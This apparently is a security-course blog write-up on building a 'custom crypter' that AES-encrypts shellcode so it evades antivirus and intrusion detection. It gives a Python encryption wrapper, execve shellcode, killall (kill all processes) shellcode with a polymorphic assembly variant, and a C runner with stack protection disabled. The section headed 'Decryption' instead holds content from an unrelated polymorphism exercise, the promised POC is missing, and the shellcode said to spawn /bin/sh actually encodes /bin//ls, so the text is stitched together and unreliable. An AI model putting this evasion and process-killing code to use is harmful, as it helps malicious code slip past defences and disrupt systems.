### Custom Crypter
------

* Create a custom crypter
* Use any encryption schema
* Use any programming language

#### Concept 
-----

A crypter is defined as a tool that has the ability to encrypt, obfuscate, and manipulate malicious code making it undetectable to common AV and IDS systems. 

Similar to the custom Encoder created in an earlier assignment, the concept is developed further with the use of an encryption scheme, leading to a higher success rate of evasion by decrypting the malicious code at run-time and executing on the target host.

The AES (Advanced Encryption Standard) cipher  algorithm also known as Rijndael, will be used to illustrate the concept of a custom Encoder:

* Symmetric-key algorithm (same key used to encrypt and decrypt the data)
* 3 different key sizes - 128/192/256 bits
* 128-bit block sizes (data is divided into 4x4 arrays each containing 16 bytes)
* High-speed performance and low RAM (memory) utilization when encrypting/decrypting

3 steps used to demonstrate the Crypter process:

* Encryption
* Decryption
* POC

#### Encryption
--------

The execve-stack shellcode from the course material will be used as a reference for the shellcode, which spawns a <code class="language-plaintext highlighter-rouge">/bin/sh</code> shell on the local host:

```bash
"\x31\xc0\x50\x68\x2f\x2f\x6c\x73\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
```

A python script will be used as a Crypter wrapper to implement the AES encryption/decryption, referenced from Code Koala [http://www.codekoala.com/posts/aes-encryption-python-using-pycrypto] [encryption-codekoala].

Note in this instance a static 128-bit key <code class="language-plaintext highlighter-rouge">DisShudBSecretEncryption</code> is hardcoded into the script for the sake of the POC to illustrate the concept, best practice is to randomly generate a key:

```python
#!/usr/bin/python

# Filename: AES_encryption.py
# Author: h3ll0clar1c3
# Purpose: Wrapper script to generate encrypted shellcode from the original shellcode
# Usage: python AES_encryption.py 

from Crypto.Cipher import AES
import sys
import os
import base64

def aes128(shc):

#block size = 16 byte arrays
 BLOCK_SIZE = 16 
 PADDING = '{'
 pad = lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * PADDING
 EncodeAES = lambda c, s: base64.b64encode(c.encrypt(pad(s)))

#static encryption/decryption key - must be 16/24/32 bytes long
 secret = 'DisShudBSecretEncryption' 
 cipher = AES.new(secret)
 encoded = EncodeAES(cipher, shc)
 print 'Encrypted shellcode using AES 128-bit key + Base64 encoded:\n\n', encoded

#execve-stack shellcode to spawn /bin/sh shell
shellcode = """
\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x6c\\x73\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x89\\xe2\\x53\x89\\xe1\\xb0\\x0b\\xcd\\x80
"""
Encryption = aes128 (shellcode)
```

As a POC, the AES encryption wrapper script is executed resulting in the original shellcode being encrypted and base-64 encoded:

```bash
osboxes@osboxes:~/Downloads/SLAE$ python AES_encryption.py 
Encrypted shellcode using AES 128-bit key + Base64 encoded:

JORa9JYDlDQi0SwuPPwAbqJZydd7ID1G+aUeYRJbEqUygnmo4zi+D0H4o2Dc/FJRJSUNfcu9zM33bg8NcB95qQhhTJ3xKvEiXnY7fLPOt3M6fesL0nrQFrwgUTl8dDr9L2W3vrdYl0Ps9ByF5OwqaQ==
osboxes@osboxes:~/Downloads/SLAE$ 
```

#### Decryption
--------------

The <code class="language-plaintext highlighter-rouge">killall</code> command on a Linux based system will literally terminate all running processes that are currently active on the target hostâ€™s machine.

Referenced from Shell-Storm [http://shell-storm.org/shellcode/files/shellcode-212.php] [killall-shellstorm]:

```c
/* By Kris Katterjohn 11/13/2006
 *
 * 11 byte shellcode to kill all processes for Linux/x86
 *
 *
 *
 * section .text
 *
 *      global _start
 *
 * _start:
 *
 * ; kill(-1, SIGKILL)
 *
 *      push byte 37
 *      pop eax
 *      push byte -1
 *      pop ebx
 *      push byte 9
 *      pop ecx
 *      int 0x80
 */

main()
{
       char shellcode[] = "\x6a\x25\x58\x6a\xff\x5b\x6a\x09\x59\xcd\x80";

       (*(void (*)()) shellcode)();
}
```

The polymorphic (modified) version of the original shellcode is scripted in Assembly:

```nasm 
; Filename: killall_poly.nasm
; Author: h3ll0clar1c3
; Purpose: Terminates processes running on the local host
; Compilation: ./compile.sh killall_poly
; Usage: ./killall_poly
; Shellcode size: 15 bytes
; Architecture: x86

global   _start

section .text
        _start:

	sub eax, eax			; initialize register // added instruction
	mov al, 0x25			; move 0x25 into al // changed the method
	sub ebx, ebx			; initialize register // added instruction
	dec ebx				; decrement ebx // replaced push 0xffffffff
	sub ecx, ecx			; initialize register // added instruction
	mov cl, 0xf7			; move 0xf7 intocl // added instruction
	neg cl				; negates 0xf7 // added instruction
	int 0x80			; call the interrupt to execute the syscall
```

The Assembly code is compiled by assembling with Nasm, and compiled as an executable binary.

Objdump is used to extract the shellcode from the <code class="language-plaintext highlighter-rouge">killall</code> command in hex format (Null free):

```bash
osboxes@osboxes:~/Downloads/SLAE$ objdump -d ./killall_poly | grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g' 
"\x29\xc0\xb0\x25\x29\xdb\x4b\x29\xc9\xb1\xf7\xf6\xd9\xcd\x80"
```

A C program scripted with the newly generated shellcode:

```c 
/**
* Filename: killall_poly_shellcode.c
* Author: h3ll0clar1c3
* Purpose: Terminates processes running on the local host   
* Compilation: gcc -fno-stack-protector -z execstack -m32 killall_poly_shellcode.c -o killall_poly_final
* Usage: ./killall_poly_final
* Shellcode size: 15 bytes
* Architecture: x86
**/

#include <stdio.h>
#include <string.h>

unsigned char code[] = \
"\x29\xc0\xb0\x25\x29\xdb\x4b\x29\xc9\xb1\xf7\xf6\xd9\xcd\x80";

int main()
{
        printf("Shellcode length: %d bytes\n", strlen(code));
        int (*ret)() = (int(*)())code;
        ret();
}
```

The C program is compiled as an executable binary with stack-protection disabled, and executed resulting in a shellcode size of 15 bytes:

```bash
osboxes@osboxes:~/Downloads/SLAE$ ./killall_poly_final Connection to 192.168.0.142 closed by remote host.
Connection to 192.168.0.142 closed.
```

The polymorphic version of the shellcode is 36% larger in size compared to the original reference from Shell-Storm.
